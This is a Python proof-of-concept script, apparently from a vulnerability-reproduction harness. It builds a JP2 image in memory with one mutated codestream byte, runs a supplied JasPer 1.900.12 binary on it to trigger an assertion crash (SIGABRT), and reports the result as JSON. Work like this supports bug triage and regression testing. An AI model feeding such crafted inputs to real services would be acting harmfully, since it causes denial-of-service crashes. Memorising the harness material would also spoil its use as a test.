#!/usr/bin/env python3
"""PoC for JasPer (JasPer Transcoder 1.900.12).

Constructs a minimal valid JP2 image in memory and mutates a single byte in the
JPEG-2000 codestream so that the tile-component coding-style (COD) marker's
transformation byte is set to a value outside {0, 1}.  When the reversible vs.
irreversible transform check is reached, the decoder hits:

    jasper: /src/jasper/src/libjasper/jpc/jpc_t1cod.c:144:
        JPC_NOMINALGAIN: Assertion `qmfbid == JPC_COX_RFT' failed.

which terminates the process with SIGABRT (assertion failure).  The payload is
built entirely in memory at runtime; no prebuilt input file is required.
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import tempfile
import time

# A valid 4x4 8-bit grayscale JP2 produced by JasPer 1.900.12.  It is a real
# baseline image; only one byte of the embedded JPEG-2000 codestream is changed
# to trigger the assertion.
_BASE_JP2_HEX = (
    "0000000c6a5020200d0a870a00000014667479706a703220000000006a703220"
    "0000002d6a703268000000166968647200000004000000040001070700000000"
    "000f636f6c7201000000000011000000006a703263ff4fff5100290000000000"
    "0400000004000000000000000000000004000000040000000000000000000107"
    "0101ff640024000143726561746f723a204a61735065722056657273696f6e20"
    "312e3930302e3132ff52000c00000001000504040001ff5c0013404048485048"
    "4850484850484850484850ff90000a00000000002a0001ff5d00140040400000"
    "00000000000000484850484850ff93808080808080ffd9"
)

# Offset of the COD marker's transformation byte (inside the codestream) and the
# value that drives qmfbid to an unexpected state.
_TRIGGER_OFFSET = 0xB5
_TRIGGER_VALUE = 0xBF

_STDOUT_LIMIT = 8192  # bytes


def build_trigger_payload():
    """Return the JP2 payload with the triggering byte mutated."""
    data = bytearray.fromhex(_BASE_JP2_HEX)
    data[_TRIGGER_OFFSET] = _TRIGGER_VALUE
    return bytes(data)


def signal_name_for_returncode(returncode):
    """Map a negative returncode to a signal name, else None."""
    if returncode is None or returncode >= 0:
        return None
    sig = -returncode
    try:
        return signal.Signals(sig).name
    except ValueError:
        return "SIG%d" % sig


def truncate_bytes(raw, limit=_STDOUT_LIMIT):
    if raw is None:
        return ""
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", errors="replace")
    if len(raw) <= limit:
        return raw
    return raw[:limit]


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Trigger an assertion failure in the JasPer transcoder."
    )
    parser.add_argument("--binary", required=True, help="Path to the target binary.")
    parser.add_argument("--json-out", default=None,
                        help="Write JSON result to this path instead of stdout.")
    parser.add_argument("--timeout", type=float, default=15.0,
                        help="Per-run timeout in seconds (default 15).")
    args = parser.parse_args(argv)

    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "stderr", "value": "", "path": None},
        "error": None,
    }

    tmpdir = None
    try:
        payload = build_trigger_payload()
        tmpdir = tempfile.mkdtemp(prefix="jasper-poc-")
        input_path = os.path.join(tmpdir, "trigger.jp2")
        output_path = os.path.join(tmpdir, "out.pnm")

        with open(input_path, "wb") as fh:
            fh.write(payload)

        command = [
            args.binary,
            "--input", input_path,
            "--output", output_path,
            "--output-format", "pnm",
        ]
        result["command"] = command

        start = time.monotonic()
        try:
            proc = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=args.timeout,
            )
            result["timed_out"] = False
            returncode = proc.returncode
            stdout = proc.stdout
            stderr = proc.stderr
        except subprocess.TimeoutExpired as exc:
            result["timed_out"] = True
            returncode = None
            stdout = exc.stdout or b""
            stderr = exc.stderr or b""
        finally:
            elapsed = time.monotonic() - start
            result["runtime_ms"] = int(round(elapsed * 1000.0))

        result["stdout"] = truncate_bytes(stdout)
        result["stderr"] = truncate_bytes(stderr)

        sig = signal_name_for_returncode(returncode) if returncode is not None else None
        result["signal"] = sig
        result["returncode"] = returncode if returncode is not None else -1

        # Normalize the observable evidence.  On a crash, surface the signal plus
        # the assertion trace from stderr; otherwise fall back to raw stderr.
        stderr_text = result["stderr"]
        if sig is not None:
            result["observable"]["kind"] = "crash_trace"
            result["observable"]["value"] = "signal=%s; %s" % (sig, stderr_text)
        elif result["timed_out"]:
            result["observable"]["kind"] = "stderr"
            result["observable"]["value"] = stderr_text or "timed out"
        else:
            result["observable"]["kind"] = "stderr"
            result["observable"]["value"] = stderr_text
    except Exception as exc:  # noqa: BLE001 - report any PoC-level failure
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        result["observable"]["value"] = result["error"]
    finally:
        if tmpdir is not None:
            try:
                for name in os.listdir(tmpdir):
                    os.unlink(os.path.join(tmpdir, name))
                os.rmdir(tmpdir)
            except OSError:
                pass

    encoded = json.dumps(result)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(encoded + "\n")
    else:
        sys.stdout.write(encoded + "\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())
